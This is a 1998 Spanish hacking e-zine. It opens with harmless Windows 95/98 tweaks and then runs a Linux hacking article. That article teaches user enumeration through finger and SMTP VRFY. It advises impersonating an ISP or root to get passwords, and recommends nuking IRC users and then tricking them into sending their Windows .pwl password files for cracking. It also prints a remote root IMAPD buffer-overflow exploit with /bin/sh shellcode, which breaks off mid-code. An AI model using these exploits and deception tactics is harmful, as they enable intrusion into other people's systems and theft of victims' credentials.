

             ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¤¤¤¤¤¤¤¤ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ
             |          ZeD-wOrLd-EzInE nº3          |
             ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ¤¤¤¤¤¤¤¤ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ

Aunque siempre lo digo me gusta repetirlo para que luego no haya mal entendidos
LA GRAN PARTE DE LOS TEXTOS AQUI EXPUESTOS SON UNA RECOPILACION QUE HE HECHO
TRAS LARGAS HORAS NAVEGANDO POR LA RED,ALGUNOS ESTAN TRADUCIDOS DE LOS 
ORIGINALES.SI ALGUNO DE ESTOS TEXTOS ES TUYO Y NO QUIERES QUE FIGURE AQUI
DIMELO Y SERA QUITADO DE INMEDIATO.

Si quieres colaborar con el e-zine mandame tu documento en formato TXT a:
                           zed@mixmail.com

    TODA LA INFORMACION QUE AQUI SE MUESTRA ESTA AQUI SOLO CON FINES
    DE APRENDIZAJE,NI YO,NI LOS AUTORES DE LOS TEXTOS NOS RESPONSABILIZAMOS
                     DEL USO QUE PUEDAS DARLES.
  

Distribuidores oficiles del ezine:
ZeD-wOrLd-----http://www.angelfire.com/ak/HACKZED/ZED2.html
La casa de LordVader-----(web no disponible momentaneamente)


Colaboradores de este nº:[^Pico^]--welcome.to/neptuno--
                         EMF(del grupo THE NEWKERS)--http://members.tripod.com/~newkers--
                         ¿nadie +? venga mandadme vuestros
                                   articulos


Agradecimientos:[^Pico^] y a EMF por ceder sus textos para este nº
                a mi papa y a mi mama,que me estaran viendo ;-)
                y a ti,lector de este e-zine,por perder un poco de
                tu tiempo en el.
          



           |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
           |               Indice de este nº                      |
           |                                                      |
           | 1.Editorial                                          |
           | 2.Actualizacion del texto "Como trucar el Win2 95"   |
           | 3.Hackeando un sistema Linux                         |
           | 4.Como jugar con HD ajenos atraves del IRC           |
           |  4.1Info del BACK ORIFICE en espa¤ol                 |
           | 5.Listado de passwords para webs XxX                 |
           | 6.Curso de antivirus                                 |
           | 7.Noticias                                           |
           | 9.Despedida y cierre                                 |
           |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~| 
-------------------------------------------------------------------------------------------------


                    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
                    [              EDITORIAL                   ]
                    &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&


Bueno se caba el verano y con el, el calor, ya empieza a hacer frio
(en Espa¤a por lo menos)y apetece quedarse en casa juagando al DOOM
navegando por la red,haciendo "cosas malas" y por que no, leyendo 
un rato,pues si eres de estas ultimas personas,estas en el lugar indicado
y en el momento justo,puesto que va a dar comienzo el nº3 del ZeD-wOrLd-EzInE.
Espero que tanto los contenidos como el nuevo aspecto del ezine sean 
de tu agrado.
Bueno pues deciros que como veis los contenidos van aumentando de nivel,lo que 
empezo siendo una "publicacion" modesta....lo sigue siendo,aunque todo hay que 
decirlo, un pelin mas "fuerte".
Despues de tres numeros, muchas cosas han sucedido,mas programas 
de "Mocosoft" ,nuevos hackers detenidos,nuevos hackeos que no tendrian que 
haverse llevado acabo....en fin un monton de cosas que espero poder contarte 
en este numero del que espero sea uno de los e-zines de tu habitual lectura.
Bueno no te aburro mas y pasemos a la accion que hay para rato.
byez
->->->->->->->->->->->->->->->->->->->->->->->->->->->->->->->->ZeD<-<-<-<-<-<-<-<-<-<-<-
-------------------------------------------------------------------------------------------------


                ############################################
                #      como trucar el Güindows95/98        #
                ############################################
                texto escrito por ZeD--www.angelfire.com/ak/HACKZED/ZED2.html
                                     --http://come.to/HaCkS-wEb-RiNg
                puedes subir este texto a tu web,bbs,ftp o lo que sea,siempre 
                que mantengas este encabezado.
                            ACTUALIZACION:26/9/98


ZeD no se hace responsable de los da¤os que el uso de este documento pueda
ocasionar a tu pc y te recomienda siempre hacer copias de seguridad 
                          (por si las moscas)


                             INDICE:
1.como trucar el internet explorer
2.pon el nombre que quieras a la papelera de reciclaje
3.cambia el icono de las carpetas por el que tu quieras
4.interface de 3.11 en w95
5.crear un acceseo directo para apagar el pc
6.cambiar el nombre de "mi pc"
7.MS2.sys
8.utilidades del sistema
9.obtener maxima memoria en MS2
10.+ opciones para la opcion "mandar a"--NUEVO--
11.programas del 3.11 en WIN2 95--NUEVO--
12.ratones "logitech"--NUEVO--
13.primeros trucos para el windo2 98--NUEVO--
 13.1 personalizacion del win2 98--NUEVO--
 13.2 relaccion de teclas rapidas--NUEVO-- 
14.PROXImamente
-------------------------------------------------------------------------------------------------
1.COMO TRUCAR EL INTERNET-EXPLORER v3.1 en adelante
¿simpre has querido cambiar el dibujito de la "E" que sale cuando estas navegando
con el internet-explorer?,pues es bien simple.
La imagen que sale es un archivo ".bmp" que esta en la carpeta
..../internet explorer/ son los archivos que se llaman "Ani38.bmp" y 
"Ani26.bmp" abrelos y mira como son.
Veras que son como una tira que segun la vas bajando se convierte en una 
animacion.Vale pues ahora crea tu logo tal como esta definido en los archivos 
cambialo y ya tienes el explorer trucado. 

2.COMO CAMBIAR EL NOMBRE A LA PAPELERA DE RECICLAJE
cambiar el nombr de la papelera de reciclaje es muy simple:
cambia el nombre en la clave del "regedit":(esta en la carpeta "windows")
HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E


3.CAMBIAR EL ICONO DE LAS CARPETAS POR EL QUE TU QUIERAS
para cambiar el icono que representa las carpetas tienes que hacer lo 
siguiente:
Muchos de los iconos que por defecto traen algunos archivos se pueden cambiar 
simplemente desde cualquier carpeta, mediante el menu ver, luego opciones... 
tipos de arhivos y por ultimo editar, e inmediatamente despues selecionar 
cambiar icono. Pero esto no siempre nos vale,sobre todo si queremos cambiar 
los iconos de por ejemplo, las carpetas, el menu de Inicio... 
Para ello el truco es el siguiente: 
Lo primero que tenemos que hacer es saber el icono que queremos cambiar... 
por ejemplo, para cambiar el icono de las carpetas, debemos ejecutar el 
registro, irnos a la seccion 
HKEY_CLASSES_ROOT\Folder\DefaultIcon en la parte derecha aparecera 
(preterminado) "C:\WINDOWS\SYSTEM\shell32.dll,3", la primera idea.. 
que no funciona :) es ir y cambiar directamente el valor de la cadena para 
poner el icono que queremos. Pero lo que tenemos que hacer es ir a la seccion 
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ 
explorer y crear una nueva clave, Shell Icons, despues creamos un nuevo valor 
de la cadena,con el numero del icono indicado en el DefaultIcon que queremos 
cambiar en nuestro caso el 3,seleccionamos este valor, pulsamos 2 veces y en 
Informacion del valor, introducimos el path del archivo que tiene el icono que 
queremos poner con su numero correspondiente. En mi caso es: 


nombre                 | datos
(predeterminado)         (valor no establecido)
3                        "c\iconos\folders.icl,70"

   Bueno.. ya hemos hecho lo + dificil. Pero aun queda algo mas. Windows 95 
guarda una cache de Iconos en el directorio de instalacion del 95, llamado 
ShellIconCache, este archivo esta oculto. Debemos de borrar este archivo para 
que los cambios surjan efecto, pero hay que borrarlo fuera de la sesion de 
Windows.. osea.. que hay que reiniciar en modo MS-DOS, quitar los atributos 
al archivo (en MSDOS este se llama shelli~1), borrarlo y reiniciar el entorno 
grafico (hoy en dia llamado sistema operativo.. :P) y ya esta, tenemos nuestro
icono favorito como icono de carpeta.. :) De igual manera con el resto 
de los iconos del 95. 

PD: Importante, si tenemos la utilidad TWEAK UI de las Powertoys de Microchof
 (si, MICROCHOF... ) podemos borrar el cache de iconos desde la pestaña Repair, 
con el boton Rebuid Icons. Y si tenemos el MicroAngelo.. todo esto nos lo hace 
ese fantastico programa.. pero conviene saber hacer las cosas "a pelo". 


4.INTERFACE DEL W3.11 EN EL W95
este es bastante mas simple que el anterior,lo que tienes que hacer es lo 
siguiente:
1-edita el archivo "SYSTEM.INI" (directorio de windows)
2-en la seccion "BOOT",busca la linea que pone "SHELL=EXPLORER.EXE"
3-cambia lo de "EXPLORER.EXE" por "PROGMAN.EXE"
4-reinicia el pc y listo

5.ACCESO DIRECTO PARA APAGAR EL PC
esto es de lo mas simple,haz lo siguiente:
crea una cceso directo en el escritorio,vete a propiedades y en lo referente a 
acceso directo,busca "DESTINO".alli pones lo siguiente:
C:\WINDOWS\RUNDLL32.EXE user.exe,ExitWindows
le das a aplicar,aceptar y ya esta

6.cambiar el nombre de "MI PC"
para hacer esto tienes que seguir los siguientes pasos:
vete al "REGEDIT" 
cambia la clave:
HKEY_CLASSES_ROOT\CLSID\{2OD04FE0-3AEA-1069-A2D8-08002B30309D} 
pon el nombre quele quieras poner a "MI PC"
y ya esta

-------------------------------------------------------------------------------------------------
7.MS2.sys
lo primero que tienes que hacer es localzar este archivo,una vez encontrado
para poder editarlo tendras que cambiar sus atributos.
una vez puedas editarlo,dirijete a la parte de "OPTIONS":

[Options]

BootDelay = 0 Aumenta la velocidad de booteo,el mensaje "Starting Windows..."
            no aparece.

BootMenu = 1 Despliega automaticamente el menu de arranque de WIndows 95.

BootMenuDefault = 1 El numero de opcion por default.

BootMenuDelay = 10 Numero de segundos que el menu de inicio es desplegado.

Logo = 0 No despliega la imagen del logo de arranque de Win95.

BootMulti = 1 Hace disponible un doble booteo con DOS.
-------------------------------------------------------------------------------------------------
8.UTILES DEL SISTEMA
el w95 trae algunas erramientas que te permitiran hacer cosillas (algo basicas)
muy interesantes para ir empezando,aqui te voy a explicar el funcionamiento de dos 
de ellas el Telnet,un viejo amigo que ya conoce todo el mundo y el Ftp,si si,has 
leido bien el 95 (bueno en realidad el MS2) trae una version bastante simple
(pero util) de programa FTP.

TELNET.
en la carpeta windows (o como la ayas llamado) hay un .exe que se llama Telnet
este programa sirve para hacer conexiones desde tu sistema a otro remoto a 
traves de una red (internet principalmente),en lo que consiste basicamente 
este programa es en acceder a unos determinados puesrtos de un sistema remoto 
en los cuales puedes hacer varias cosas,como por ejm:
bajarte el correo,mirar el directorio de una web.....
aqui te expongo una lista de los puertos con una descripcion de para lo que 
vale cada uno de ellos:(el numero que aparece entre parentesis es el puerto)
auth (113)
conference (531)
courier (530)
daytime (13)
discard (9)
domain (53)
echo (7)
efs (520)
exec (512)
finger (79)
ftp (21)
gopher (70)
hostnames (101)
http (80)
ingreslock (1524)
link (87)
login (513)
mtp (57)
nameserver (42)
netbios (139)
netnews (532)
netstat (15)
nntp (119)
pop2 (109)
pop3 (110)
proxy (8080)
qotd (17)
remotefs (556)
rje (77)
sftp (115)
shell (514)
smtp (25)
spooler (515)
sunrpc (111)
supdup (95)
systat (11)
telnet (23)
tempo (526)
tftp (69)
time (37)
uucp (540)
uucp-path (117)
whois (43)
www (80)

¿como se hace un Telnet?
pues hacerlo es muy simple:

si nos proporcionan la
dirección telnet "maquina.remota.es 2010" hariamos lo siguiente: (puede
variar segun sistemas):
  * Tecleamos en la linea de comandos "TELNET maquina.remota.es 2010" (En
    otros sistemas teclearemos "TELNET" y después "OPEN maquina.remota.es
    2010" ) con lo que veremos algo parecido a esto:

    * telnet MAQUINA.REMOTA.ES 2010
    * Trying 130.132.21.53 Port 2010 ...
    * Connected to MAQUINA.REMOTA.ES
    * Escape character is ...

  * Esto nos dice más o menos que está intentando conectar con la dirección,
    nos devuelve la dirección IP, se conecta, y nos dice cual es el "caracter
    escape".
  * Una vez hemos conectado se nos pide un "login" y/o "password" para entrar
    a la máquina remota. En algunos casos podremos conectar a la maquina
    remota con el login "guest" (invitado) pero la mayoria de las veces
    deberemos saber el login antes de conectarnos.
  * El siguiente paso es configurar la emulación de terminal, es decir,
    decirle al sitio remoto como queremos que nos muestre los datos en
    nuestra pantalla. La configuración más común es la VT100, que es la
    estandar para las comunicaciones basadas en terminales. (algunos clientes
    telnet configuran ellos sólos la emulación).
  * El último paso (después de haber utilizado el servicio es salir ;-) Como
    las pulsaciones de tecla no las hacemos "realmente" en nuestra máquina,
    sino en la máquina remota, necesitamos el "caracter escape" que se nos
    dió al conectar para pasar al "modo comando" ( habitualmente teclas
    control + paréntesis derecho ).

Comandos disponibles:

CLOSE         Termina la conexión TELNET con la maquina remota y vuelve al
"modo comando" (si empezamos alli) o sale de TELNET.
QUIT           Sale del programa TELNET; si estás conectado a una máquina
remota, QUIT te desconecta y luego sale de TELNET.
SET ECHO   Si no ves lo que estás escribiendo, o si escribes y ves doble,
este comando soluciona el problema.
OPEN           Abre una conexión a una máquina remota.

ATENCION: Al presionar las teclas Enter o Return, sales del modo comando 
TELNET y vuelves a la sesión TELNET.
te dejo aqui,investiga y juega con telnet,no es muy dificil y pronto 
aprenderas a usarlo de una manera mas "productiva" ;-)

FTP-MS2
si entras en Ms2 y en el promp pones "ftp" te saldra esto "ftp>"
ahora parasaber los comandos que puedes usar pon "?" y te saldra unalista 
de los comandos que puedes usar en el programa,juega con ellos y prueba cosas
-------------------------------------------------------------------------------------------------
9. OBTENER MAXIMA MEMORIA EN MS2

para tener el maximo de memoria bajo MS2 añade esta linea en la seccion 
[386Enh]
del system.ini
LocalLoadHigh=1
-------------------------------------------------------------------------------------------------
10. + opciones para la opcion "mandar a"

para añadir mas opciones a la opcion de "enviar a" hacer lo siguiente:
en la carpeta de windows encontraras una que se llama 
"Send to"
solo tienes que añadir un acceso directo a donde quieras enviar los archivos 
en esta carpeta.
!!si añades el winzip podras comprimir los archivos rapidamente¡¡
-------------------------------------------------------------------------------------------------
11. usa los programas del win2 3.11 en el win2 95

en la carpeta "c:\windows\system" hay un programa que te permite usar los 
programas de W3.11,este se llama "MKCOMPAT.EXE"
es muy sencillo de usar,por lo que no he creido que haga falta explicar 
su funcionamiento.
-------------------------------------------------------------------------------------------------
12. usar el boton central de los ratones "logitech"

¿tienes un raton de la marca "logitech"? ¿si? pues estas de suerte
si quieres usar el boton del centro del raton deveras hacer lo siguiente:
crea un archivo de texto y pon lo siguiente en el:

REGEDIT4
[HKEY_LOCAL_MACHINE\SOFTWARE\Logitech\MouseWare\CurrentVersion\SerialV\0000]
"DoubleClick"="001"

guardalo como "midclick.reg" y luego ejecutalo
-------------------------------------------------------------------------------------------------
13. PRIMEROS TRUCOS PARA EL WIN2 98
 
 13.1 PERSONALIZAR EL WINDO2 98
en el cd del win2 98 hay una erramienta que te permite configurar muchas 
cosas del win2 98,esta se llama "Tweak UI" y esta en el directorio 
"TOOLS\RESKIT\POWERTOY" del cd.
no busque ningun .EXE por que no lo hay ¿y como coñe lo instalo entonces?
(te preguntaras) pues muy simple,en esta carpeta hay un archivo que se llama
"tweakui.inf" pulsa con el boton derecho del raton en el y selecciona la 
opcion "instalar" ahora cierralo todo y dirijete al panel de control,alli 
veras el exe,lo ejecutas ya investigar.
si quieres saber lo que te puede posibilitar este programa,te lo digo 
ahora PISPO:

Velocidad y propiedades a fondo del ratón 
Flechas de accesos directos, quitar y poner 
Modificar iconos en Escritorio 
Velocidad del scroll de paginas 
Efectos especiales, al arrancar y de los errores (beep) 
Animaciones y otras caracteristicas de los menus 
Modificar propiedades el IE4.x 
Combiar, poner y quitar iconos en el Panel de Control, y Escritorio 
Que discos se veran desde MiPC 
Grabar el password para entrar a la red 
Evitar y configurar el scandisk al arrancar el PC 
Activar F4 para arrancar con el S.O. anteriormente instalado 
AutoPlay de CD musical y de datos 
Borrar los log-on registrados en nuestro sistema     

andaros al loro de las flechas <> que hayen el extremo derecho superior
porque esconden mas opciones,loque te he dicho arriba es solo un ejemplo ya
que hay mas cosas que prefiero que veas por timismo.
-------------------------------------------------------------------------------------------------
 13.2 relaccion de convinaciones de teclas rapidas en win2 98

Control a .................abre la carpeta de mis documentos
Control b .................abre el cuadro de dialogo Buscar
Control c .................copia lo seleccionado
Control d .................alinear a la derecha el texto
Control j ..................alinea el texto a pagina llena
Control t ..................alinea el texto a la mitad
Control e ..................seleccionar todo
Control f ..................sangría francesa
Control g .................guardar como
Control h .................sangría de texto
Control i ..................abre el cuadro de dialogo Ir a.
Control k .................hace la letra cursiva
Control l ..................abre el cuadro de dialogo de buscar y
remplazar
Control m ................abre el cuadro de dialogo de fuentes
Control n .................activa y desactiva negritas
Control p .................abre el cuadro para imprimir
Control r ..................abre el cuadro de dialogo de guardar cambios

Control s. .................activa  y desactiva subrayar
Control u .................abre nuevo documento
Control v .................pega lo seleccionado
Control x .................corta lo seleccionado
Control 0 .................da a doble espacio
Control z .................deshace la acción anterior
Control Esc .............abre la lista de inicio
Alt           .................activa la barra de herramientas
Alt + la letra de la barra de herramientas despliega la lista de tareas
Gr + ? =\
Gr + q = @
Gr + e = Esquema de pantalla
Gr + y = desplaza el cursor al principio
Gr + i = Vista preliminar
Gr + o Hace un encabezado de pie de pagina con numero
Gr + * = ~
Gr + k = Hacer un Hipervínculo
Gr + l = Hace un encabezado de pie de pagina con letra
-------------------------------------------------------------------------------------------------
14.PROXImamente....
pues la verdad es que no se que voy a incluir,si tienes algo que comentar o 
quieres mandarme cosas nuevas ya sabes mandamelas a zed@mixmail.com
y sera incluido en la proxima actualizacion

byez--:) 
(((((((((((((((((((((((((((((((((((ZeD-wOrLd-EzInE nº3)))))))))))))))))))))))))))))))))))))))))))


  **********************************************************************
  *              						                       *
  *                    HACKEANDO UN SISTEMA LINUX  		           *
  *		          ----------------------------                     *
  **********************************************************************
                           POR: [^Pico^]


Como todo el mundo sabra ya, linux es cada vez mas popular entre los usuarios.
Usar linux es guay y mucha gente que antes le daba la espalda ahora se 
encuentra con linux instalado en su disco duro. Pero no todo va a ser tan
bonito, linux es un muy buen sistema operativo, pero como todo,tiene fallos.
En este texto voy a intentar explicar algunos metodos para conseguir hackear
un sistema linux. Lo hago con este sistema ya que es el mas conocido,aunque
muchas cosas son exportables a otros sistemas operativos parecidos,como bsd,
sunOS y cualquier otro derivado de unix.



1.- Consiguiendo informacion de la maquina.
************************************************


Una de las cosas mas importantes a la hora de hackear un sistema (o intentar)
es obtener la maxima informacion disponible sobre el. En definitiva se trata
de obtener las versiones de sus daemons,como pueden ser ftp,sendmail,etc, los
puertos que tiene abiertos y toda informacion que nos pueda ser util.

Para conseguir las versiones de los demonios se accede al puerto en cuestion,
y normalmente solo con eso se nos muestra una linea o dos con informacion.Aqui
pongo una lista de los puertos completa,ya se que completa es un coñazo pero
la pongo por si a alguien le es util.


                  **** LISTA DE PUERTOS *****


tcpmux          1/tcp                           # rfc-1078
echo            7/tcp
echo            7/udp
discard         9/tcp           sink null
discard         9/udp           sink null
systat          11/tcp          users
daytime         13/tcp
daytime         13/udp
netstat         15/tcp
qotd            17/tcp          quote
chargen         19/tcp          ttytst source
chargen         19/udp          ttytst source
ftp-data        20/tcp
ftp             21/tcp
telnet          23/tcp
smtp            25/tcp          mail
time            37/tcp          timserver
time            37/udp          timserver
rlp             39/udp          resource        # resource location
name            42/udp          nameserver
whois           43/tcp          nicname         # usually to sri-nic
domain          53/tcp
domain          53/udp
mtp             57/tcp                          # deprecated
bootps          67/udp                          # bootp server
bootpc          68/udp                          # bootp client
tftp            69/udp
gopher          70/tcp                          # gopher server
rje             77/tcp
#finger         79/tcp
#http           80/tcp                          # www is used by some broken
#www            80/tcp                          # progs, http is more correct
link            87/tcp          ttylink
kerberos        88/udp          kdc             # Kerberos authentication--udp
kerberos        88/tcp          kdc             # Kerberos authentication--tcp
supdup          95/tcp                          # BSD supdupd(8)
hostnames       101/tcp         hostname        # usually to sri-nic
iso-tsap        102/tcp
x400            103/tcp                         # x400-snd        104/tcp
csnet-ns        105/tcp
#pop-2          109/tcp                         # PostOffice V.2
#pop-3          110/tcp                         # PostOffice V.3
#pop            110/tcp                         # PostOffice V.3
sunrpc          111/tcp
sunrpc          111/tcp         portmapper      # RPC 4.0 portmapper UDP
sunrpc          111/udp
sunrpc          111/udp         portmapper      # RPC 4.0 portmapper TCP
auth            113/tcp         ident           # User Verification
sftp            115/tcp
uucp-path       117/tcp
nntp            119/tcp         usenet          # Network News Transfer
ntp             123/tcp                         # Network Time Protocol
ntp             123/udp                         # Network Time Protocol
#netbios-ns      137/tcp         nbns
#netbios-ns      137/udp         nbns
#netbios-dgm     138/tcp         nbdgm
#netbios-dgm     138/udp         nbdgm
#netbios-ssn     139/tcp         nbssn
#imap           143/tcp                         # imap network mail protocol
NeWS            144/tcp         news            # Window System
snmp            161/udp
snmp-trap       162/udp
exec            512/tcp                         # BSD rexecd(8)
biff            512/udp         comsat
login           513/tcp                         # BSD rlogind(8)
who             513/udp         whod            # BSD rwhod(8)
shell           514/tcp         cmd             # BSD rshd(8)
syslog          514/udp                         # BSD syslogd(8)
printer         515/tcp         spooler         # BSD lpd(8)
talk            517/udp                         # BSD talkd(8)
ntalk           518/udp                         # SunOS talkd(8)
efs             520/tcp                         # for LucasFilm
route           520/udp         router routed   # 521/udp too
timed           525/udp         timeserver
tempo           526/tcp         newdate
courier         530/tcp         rpc             # experimental
conference      531/tcp         chat
netnews         532/tcp         readnews
netwall         533/udp                         # -for emergency broadcasts
uucp            540/tcp         uucpd           # BSD uucpd(8) UUCP service
klogin          543/tcp                         # Kerberos authenticated rlogin
kshell          544/tcp         cmd             # and remote shell
new-rwho        550/udp         new-who         # experimental
remotefs        556/tcp         rfs_server rfs  # Brunhoff remote filesystem
rmonitor        560/udp         rmonitord       # experimental
monitor         561/udp                         # experimental
pcserver        600/tcp                         # ECD Integrated PC board srvr
mount           635/udp                         # NFS Mount Service
pcnfs           640/udp                         # PC-NFS DOS Authentication
bwnfs           650/udp                         # BW-NFS DOS Authentication
kerberos-adm    749/tcp                         # Kerberos 5 admin/changepw
kerberos-adm    749/udp                         # Kerberos 5 admin/changepw
kerberos-sec    750/udp                         # Kerberos authentication--udp
kerberos-sec    750/tcp                         # Kerberos authentication--tcp
kerberos_master 751/udp                         # Kerberos authentication
kerberos_master 751/tcp                         # Kerberos authentication
krb5_prop       754/tcp                         # Kerberos slave propagation
listen          1025/tcp        listener RFS remote_file_sharing
nterm           1026/tcp        remote_login network_terminal
#kpop           1109/tcp                        # Pop with Kerberos
ingreslock      1524/tcp
tnet            1600/tcp                        # transputer net daemon
cfinger         2003/tcp                        # GNU finger
nfs             2049/udp                        # NFS File Service
eklogin         2105/tcp                        # Kerberos encrypted rlogin
krb524          4444/tcp                        # Kerberos 5 to 4 ticket xlator
irc             6667/tcp                        # Internet Relay Chat

			-----------------


Bueno,despues de todo este rollo os pregutareis: y cuales son realmente los
puertos importantes?? Pues bien,los realmente importantes (mas o menos) son:
el ftp(21),telnet(23),sendmail(25),finger(79),http(80),pop(110) y imap(143).
Estos son (para mi al menos) los que mas usaremos a la hora de hackear.

Para sacar informacion de cada uno de ellos basta con ir haciendo telnets uno
por uno. Ej: telnet maquina.com 21 --> te dije la version del ftp, telnet ma-
quina.com 23 --> te dice la version del sistema operativo(normalmente), y asi
con todos. Recomiendo que a la hora de mirar versiones,etc. no intenteis meter
ningun password porque quedara todo grabado junto con vuestra direccion ip.

Tambien es interesante hacer un scaneo de puertos a la maquina. Hay muchos pro-
gramas en internet que hacen esta funcion. Yo recomiendo el phobia, que es bas-
tante rapido. Estos programas a veces traen opciones para scanear solo un de-
terminado numero de puertos, por ejemplo del 1 al 200. El phobia trae tb po-
sibilidades de ataque,como sobreescribir un buffer en el ftpd,etc. pero que
ya tiene mucho tiempo y es improbable que funcione.


1.1.- POSIBILIDADES DEL FINGER Y SMTP.
     ----------------------------------

El puerto del finger(79) se usa para conseguir informacion de los usuarios
de esa maquina. Se usa simplemente con: telnet maquina.com 79. Si obteneis
una respuesta como: "telnet: Unable to connect to remote host: Connection 
refused", es que o tiene activado un firewall(esto ya se vera mas adelante)
o tiene cerrado el puerto del finger. Si se conecta sin problemas,simplemente
tecleando un nombre de usuario conseguireis informacion sobre el.No os preo-
cupeis si lo que escribais no sale en pantalla,es porque tiene el eco redire-
ccionado a una salida nula. Si por ejemplo tecleais "test",y resulta que al-
guien tiene ese nombre de usuario(login), os saldra algo como esto:

Login: test                             Name: Jose Ramon Suarez
Directory: /home/test                   Shell: /bin/bash
Last login Sat May  9 00:16 (CEST) on tty3
No mail.
No Plan.


Como veis se muestra mucha informacion util,como su nombre completo,su direc-
torio home,si tiene mail,etc.. Esto puede ser usado para intentar algun pass,
como joramon..ya entendeis. Tambien podeis mandarle un mail haciendos pasar por
el root del sistema y pidiendole su password con alguna excusa,pero esto ya
esta muy visto y no creo que funcione,ademas,como se lo diga al root de verdad
y no hayais usado un metodo para mandar mails anonimos..pillais,no? :).

Tb puede usarse el sendmail(25) para conseguirse un resultado similar. La 
cuestion es que muchos proovedores de internet (por lo menos en españa), en vez
de usar un servidor para correo entrante(pop-110) y otro para correo saliente
(smtp-25) pues usan uno solo para las dos cosas,y si usan dos pues en el de
correo entrante dejan abierto el puerto de smtp. Pues bien,si haceis un telnet
al servidor de correo entrante al puerto 25,y luego usais el comando vrfy para
verificar si existe un usuario en cuestion muchas veces os devolvera el nombre
del usuario completo. Ejemplo:

Un tio tiene de mail jose@ctv.es. Pues poneis; telnet pop.ctv.es 25 --> luego,
vrfy jose , y os devolvera algo como: Jose Luis Suarez Vazquez <jose@ctv.es>.
Con esto,y si sabeis la poblacion del tio, pues llamais al 003 para sacar su
telefono,lo llamais diciendo que sois de ctv....etc etc, lo demas ya lo dejo
a vuestra imaginacion :). Ademas,el servicio de finger cada vez esta mas en
desuso por lo que este metodo cobra mas importancia. 

Nota: El comando expn hace la misma funcion,pero normalmente esta desactivado.



2.- CONSIGUIENDO UNA CUENTA:

********************************


Esto es una de las cosas mas dificiles (aunque parezca mentira) a la hora de
hackear. La forma mas facil de conseguirla es con ingenieria social,pero ya 
esta muy visto y es muy chungo que lo consigais. Por si alguien no lo sabe
ingenieria social es intentar engañar a alguien para que te de su pass o in-
formacion util. Lo de la tia novata ya esta muy visto,o sea que yo recomiendo
nukear a alguien un par de veces,y cuando ya este el tio hasta las narices le
haceis un query y le decis algo como: "joer,no se quien anda nukeando..no estas
protegido?", luego le enseñas como protegerse pero le dices que para saber
que puerto tiene que cerrar exactamente te tiene que mandar por dcc los files
con extension pwl de su \windows\,captais la idea,no? :). Luego crackeais el
fichero con el glide por ejemplo.

Ahora voy a centrarme ya en el Linux,lo de antes era para engañar a alguien
con win95 y poder acceder al server de su proveedor con su login:pass.

Hay varios metodos en algunas distribuciones de linux que te permiten conse-
guir una cuenta desde fuera, e incluso algunas con nivel de root.

Esta que voy a poner ahora es para RedHat,funciona hasta la version 4.0 in-
cluida y lo que hace es sobreescribir un buffer en el imap(puerto 143) con-
siguiendo una shell con nivel de root. Tienes que tener instalado el pro-
grama netcat (esta disponible en muchos lugares de la red), y se utiliza
con: "(imap 0000000000;cat) | nc maquina.com 143", tienes que poner muchos
ceros para que rule,aunque va a ser chungo que encuentres una redhat 4.0 la
verdad. Bueno,aqui va:


              ---------- comienzo ----------
/*
 * IMAPD REMOTE EXPLOIT
 * exploit code from TiK/paladine's imap+nc exploit
 * socket code by BiT
 */

#include <stdio.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/time.h>
#include <errno.h>

void read_soc(int sock);
void read_key(int sock);

char shell[] =
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
"\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
"\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\xe8\xc0\xff\xff\xff/bin/sh";

void phand(int s)
{
  return;
}

void ihand(int s)
{
  printf("SIGINT catched, exiting...\n");
  exit(4);
}

void dome()
{
  printf("IMAPD REMOTE EXPLOIT\n");
  printf("Exploit code by TiK/paladine\n");
  printf("Socket code by BiT\n\n");
}

void banner(char *wee)
{
  printf("Syntax: %s <host> [<offset>]\n",wee);
  exit(1);
}

void main(int argc, char *argv[])
{
  int i,a,s;
  long val;
  fd_set blockme;
  char username[1024+255];
  char buf[1500];

  dome();
  if(argc<2)
    banner(argv[0]);

  if(argc>2)
    a=atoi(argv[2]);
  else
    a=0;

